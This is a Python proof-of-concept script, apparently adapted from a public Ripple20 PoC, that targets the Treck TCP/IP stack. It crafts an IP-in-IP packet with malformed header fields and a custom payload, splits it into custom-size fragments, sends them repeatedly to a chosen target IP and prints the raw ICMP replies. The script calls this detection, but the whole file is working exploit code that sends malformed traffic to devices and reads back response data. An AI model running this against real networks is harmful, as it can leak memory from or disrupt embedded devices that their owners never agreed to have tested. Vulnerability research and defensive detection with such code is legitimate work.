from scapy.all import IP, conf, raw, send
import argparse
import socket

"""
This script is a modified PoC for the Ripple20 vulnerability 
to demonstrate the detection of the Treck TCP/IP stack.
"""

def fragmentCustom(self):
    """
    Modified version of Scapy's "fragment" function 
    to create custom-size fragments instead of fixed-size ones.
    
    Creates one fragment with a payload length of 24 bytes 
    and a second fragment with the rest of the payload.
    """
    lst = []
    fnb = 0
    fl = self
    while fl.underlayer is not None:
        fnb += 1
        fl = fl.underlayer

    for p in fl:
        s = raw(p[fnb].payload)

        # First fragment
        q = p.copy()
        del(q[fnb].payload)
        del(q[fnb].chksum)
        del(q[fnb].len)
        q[fnb].flags |= 1  # Set more fragments flag
        q[fnb].frag += 0
        r = conf.raw_layer(load=s[0:24])  # Copy first 24 bytes
        r.overload_fields = p[fnb].payload.overload_fields.copy()
        q.add_payload(r)
        lst.append(q)

        # Second fragment
        q = p.copy()
        del(q[fnb].payload)
        del(q[fnb].chksum)
        del(q[fnb].len)
        q[fnb].frag += 3
        r = conf.raw_layer(load=s[24:])  # Copy the rest
        r.overload_fields = p[fnb].payload.overload_fields.copy()
        q.add_payload(r)
        lst.append(q)

    return lst


if __name__ == "__main__":

    opts = argparse.ArgumentParser()

    opts.add_argument('-t', '--target', help="IP Address of target", required=True)
    opts.add_argument('-c', '--count', help='Number of fragmented pings to send', type=int, default=10)
    opts.add_argument('-o', '--offset', help='Number of bytes to offset to remove normal ICMP data from response', type=int, default=72)
    args = opts.parse_args()

    # New payload: Crafting a specific message
    innerPayload = "\x00"*40 + "CyRAACS is able to inject the Payload"
    innerPacket = IP(ihl=0xf, len=100, proto=0, dst=args.target)
    innerPacket.add_payload(innerPayload.encode("ascii"))

    outerPacket = IP(dst=args.target, id=0xabcd) / innerPacket
    frags = fragmentCustom(outerPacket)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)

    for c in range(args.count):
        for f in frags:
            send(f)
        recv, addr = s.recvfrom(1508)
        print("Response received!")
        print(recv[args.offset:])
